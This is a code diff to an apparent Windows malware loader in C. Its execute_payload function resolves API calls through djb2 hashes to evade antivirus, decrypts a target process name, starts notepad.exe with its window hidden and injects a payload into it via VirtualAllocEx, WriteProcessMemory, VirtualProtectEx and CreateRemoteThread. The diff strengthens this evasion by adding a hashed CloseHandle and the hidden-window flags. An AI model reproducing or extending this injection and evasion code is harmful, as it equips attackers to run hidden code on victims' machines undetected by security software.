@@ -9,6 +9,7 @@ typedef LPVOID (WINAPI *pVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE
 typedef BOOL (WINAPI *pWriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
 typedef BOOL (WINAPI *pVirtualProtectEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
 typedef HANDLE (WINAPI *pCreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
+typedef BOOL (WINAPI *pCloseHandle)(HANDLE hObject);
 
 bool execute_payload(char* payload_buffer, SIZE_T payload_size) {
     // load key runtime (in stack)
@@ -24,6 +25,7 @@ bool execute_payload(char* payload_buffer, SIZE_T payload_size) {
     DWORD hash_WriteProcMem = 0x6F22E8C8;   // djb2 for "WriteProcessMemory"
     DWORD hash_VirtProtEx = 0xD812922A;     // djb2 for "VirtualProtectEx"
     DWORD hash_CreateRemThrd = 0xAA30775D;  // djb2 for "CreateRemoteThread"
+    DWORD hash_CloseHandle = 0x3870CA07;    // djb2 for "CloseHandle"
 
     // --- load DLL dynamically
 
@@ -42,13 +44,19 @@ bool execute_payload(char* payload_buffer, SIZE_T payload_size) {
     pWriteProcessMemory fnWriteProcessMemory = (pWriteProcessMemory) get_api_by_hash(hKernel32, hash_WriteProcMem);
     pVirtualProtectEx fnVirtualProtectEx = (pVirtualProtectEx) get_api_by_hash(hKernel32, hash_VirtProtEx);
     pCreateRemoteThread fnCreateRemoteThread = (pCreateRemoteThread) get_api_by_hash(hKernel32, hash_CreateRemThrd);
+    pCloseHandle fnCloseHandle = (pCloseHandle) get_api_by_hash(hKernel32, hash_CloseHandle);
 
     // if AV blocks a function -> return
-    if (!fnCreateProcessA || !fnVirtualAllocEx || !fnWriteProcessMemory || !fnVirtualProtectEx || !fnCreateRemoteThread) return false;
+    if (!fnCreateProcessA || !fnVirtualAllocEx || !fnWriteProcessMemory || !fnVirtualProtectEx || !fnCreateRemoteThread || !fnCloseHandle) return false;
 
     // --- setup target process (notepad.exe)
 
-    STARTUPINFOA si = { sizeof(si) };
+    STARTUPINFOA si = { 0 };
+    si.cb = sizeof(si);
+    // NOTE: force GUI window to remain hidden
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE; 
+
     PROCESS_INFORMATION pi = { 0 };
     
     xor_crypt(enc_target_process, sizeof(enc_target_process), cypher_key, cypher_key_len);
@@ -67,8 +75,8 @@ bool execute_payload(char* payload_buffer, SIZE_T payload_size) {
     LPVOID remote_buffer = fnVirtualAllocEx(pi.hProcess, NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     
     if (!remote_buffer) {
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
+        fnCloseHandle(pi.hProcess);
+        fnCloseHandle(pi.hThread);
         return false;
     }
 
@@ -76,16 +84,16 @@ bool execute_payload(char* payload_buffer, SIZE_T payload_size) {
 
     SIZE_T bytes_written;
     if (!fnWriteProcessMemory(pi.hProcess, remote_buffer, payload_buffer, payload_size, &bytes_written)) {
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
+        fnCloseHandle(pi.hProcess);
+        fnCloseHandle(pi.hThread);
         return false;
     }
 
     // change permissions to execute (DEP bypass)
     DWORD oldProtect = 0;
     if (!fnVirtualProtectEx(pi.hProcess, remote_buffer, payload_size, PAGE_EXECUTE_READ, &oldProtect)) {
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
+        fnCloseHandle(pi.hProcess);
+        fnCloseHandle(pi.hThread);
         return false;
     }
 
@@ -93,15 +101,15 @@ bool execute_payload(char* payload_buffer, SIZE_T payload_size) {
     HANDLE hRemoteThread = fnCreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote_buffer, NULL, 0, NULL);
     
     if (!hRemoteThread) {
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
+        fnCloseHandle(pi.hProcess);
+        fnCloseHandle(pi.hThread);
         return false;
     }
 
     // clean handlers
-    CloseHandle(hRemoteThread);
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
+    fnCloseHandle(hRemoteThread);
+    fnCloseHandle(pi.hProcess);
+    fnCloseHandle(pi.hThread);
 
     return true;
 }
